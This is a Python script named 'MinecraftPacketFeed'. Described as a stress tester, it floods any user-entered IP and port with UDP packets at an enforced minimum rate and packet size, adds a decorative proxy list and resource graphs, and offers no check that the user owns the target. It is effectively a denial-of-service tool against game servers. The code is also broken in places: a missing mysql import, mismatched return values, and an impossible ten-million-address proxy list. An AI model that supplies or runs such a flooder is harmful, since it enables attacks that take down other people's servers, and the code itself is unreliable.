import pyfiglet
import socket
import time
import psutil
import threading
import random
import os
import shutil
import matplotlib.pyplot as plt
import numpy as np

# Define constants
MAX_DURATION = 1000  # Maximum test duration in seconds
MAX_PACKETS_PER_SECOND = 1000000  # Maximum packets per second
MIN_PACKETS_PER_SECOND = 1000  # Minimum packets per second for stress testing
MIN_PACKET_SIZE = 1024  # Minimum packet size in bytes for stress testing
PROXY_TIMEOUT = 5  # Timeout for proxy connections in seconds
NUM_PROXIES = 10000000  # Number of proxy IP addresses

# Generate proxy IP addresses
PROXIES = [(f"192.0.2.{i}", 12345) for i in range(1, NUM_PROXIES + 1)]

# Function to connect to the database
def get_database():
    try:
        # Replace the following variables with the actual paths and database name
        database_path = "/path/to/your/database"
        backup_path = "/path/to/backup/folder"
        database_name = "your_database.db"

        # Create a backup folder if it doesn't exist
        if not os.path.exists(backup_path):
            os.makedirs(backup_path)

        # Copy the database file to the backup folder
        shutil.copy2(os.path.join(database_path, database_name), backup_path)
        print("Database backup created successfully.")
    except Exception as e:
        print(f"Error creating database backup: {e}")

# Function to connect to the database
def connect_to_database():
    try:
        # Update connection details according to your database configuration
        connection = mysql.connector.connect(
            host="localhost",
            user="username",
            password="password",
            database="minecraft"
        )
        print("Connected to database successfully!")
        return connection
    except Exception as e:
        print(f"Failed to connect to the database: {e}")
        return None

# Function to execute a database query
def execute_query(connection, query):
    try:
        cursor = connection.cursor()
        cursor.execute(query)
        result = cursor.fetchall()
        cursor.close()
        return result
    except Exception as e:
        print(f"Error executing query: {e}")
        return None

# Function to fetch player data from the database
def fetch_player_data(connection):
    query = "SELECT * FROM players"
    result = execute_query(connection, query)
    if result:
        print("Player data:")
        for row in result:
            print(row)  # Adjust printing format based on your database schema
    else:
        print("Failed to fetch player data from the database.")

# Function to send packets
def send_packets(host, port, num_packets_per_second, duration, packet_size):
    try:
        packets_sent = 0
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(PROXY_TIMEOUT)
        while time.time() < end_time and packets_sent < num_packets_per_second * duration:
            proxy = random.choice(PROXIES)
            packet_data = b'A' * packet_size
            sock.sendto(packet_data, (host, port))
            packets_sent += 1
            time.sleep(1.0 / num_packets_per_second)
        return packets_sent
    except (socket.error, socket.timeout) as e:
        print(f"Socket error: {e}")
        return -1
    except Exception as e:
        print(f"An unexpected error occurred while sending packets: {e}")
        return -1
    finally:
        sock.close()

# Function to simulate TPS data
def simulate_tps_data(duration):
    tps_data = []
    for _ in range(duration):
        tps_data.append(random.uniform(18, 20))
        time.sleep(1)
    return tps_data

# Function to plot live monitoring data
def plot_live_data(cpu_data, memory_data, disk_data, tps_data):
    x = np.arange(0, len(cpu_data))
    fig, ax1 = plt.subplots()

    color = 'tab:red'
    ax1.set_xlabel('Time (s)')
    ax1.set_ylabel('CPU (%)', color=color)
    ax1.plot(x, cpu_data, color=color)
    ax1.tick_params(axis='y', labelcolor=color)

    ax2 = ax1.twinx()  
    color = 'tab:blue'
    ax2.set_ylabel('Memory (%)', color=color)  
    ax2.plot(x, memory_data, color=color)
    ax2.tick_params(axis='y', labelcolor=color)

    fig.tight_layout()  
    plt.show()

# Function to monitor system resources
def monitor_resources(duration):
    cpu_data = []
    memory_data = []
    disk_data = []
    tps_data = simulate_tps_data(duration)

    for _ in range(duration):
        cpu_usage, memory_usage, disk_usage, _ = get_server_info()
        cpu_data.append(cpu_usage)
        memory_data.append(memory_usage)
        disk_data.append(disk_usage)
        time.sleep(1)

    return cpu_data, memory_data, disk_data, tps_data

# Function to get server info
def get_server_info():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    disk = psutil.disk_usage('/')
    disk_usage = disk.percent
    return cpu_usage, memory_usage, disk_usage

# Function to print help
def print_help():
    print("Available commands:")
    print("/print cpu - Print CPU usage")
    print("/print memory - Print memory usage")
    print("/print packets - Print total packets sent")
    print("/overall send packets - Print overall packets sent during the test session")
    print("/getinfo - Get specifications of the physical server's PC")
    print("/get database - Download the server's database")
    print("/exit - Exit the program")

# Function for loading screen
def loading_screen():
    try:
        while True:
            cpu_usage, memory_usage, _, _ = get_server_info()
            loading_bar_length = 20
            cpu_bar = "#" * int(cpu_usage * loading_bar_length / 100)
            memory_bar = "#" * int(memory_usage * loading_bar_length / 100)
            print(f"CPU Usage: {cpu_usage:5.1f}% [{cpu_bar:<{loading_bar_length}}] | "
                  f"Memory Usage: {memory_usage:5.1f}% [{memory_bar:<{loading_bar_length}}]", end="\r")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nExiting loading screen...")

# Main function
def main():
    try:
        # Display program name in ASCII art
        program_name = "MinecraftPacketFeed"
        ascii_art = pyfiglet.figlet_format(program_name)
        print(ascii_art)

        # Start the loading screen thread
        loading_thread = threading.Thread(target=loading_screen)
        loading_thread.daemon = True
        loading_thread.start()

        # Connect to the database
        get_database()

        # Get user input for target server and test parameters
        minecraft_host = input("Enter target IP address: ")
        minecraft_port = int(input("Enter target port number: "))
        duration = int(input("Enter test duration in seconds (max 1000): "))
        num_packets_per_second = int(input("Enter number of packets per second (max 1000000): "))
        packet_size = int(input("Enter packet size in bytes: "))

        duration = min(duration, MAX_DURATION)
        num_packets_per_second = min(num_packets_per_second, MAX_PACKETS_PER_SECOND)
        num_packets_per_second = max(num_packets_per_second, MIN_PACKETS_PER_SECOND)
        packet_size = max(packet_size, MIN_PACKET_SIZE)

        total_packets_sent = send_packets(minecraft_host, minecraft_port, num_packets_per_second, duration, packet_size)
        print(f"Total packets sent: {total_packets_sent}")

        # Plot live monitoring data
        cpu_data, memory_data, disk_data, tps_data = monitor_resources(duration)
        plot_live_data(cpu_data, memory_data, disk_data, tps_data)

    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()
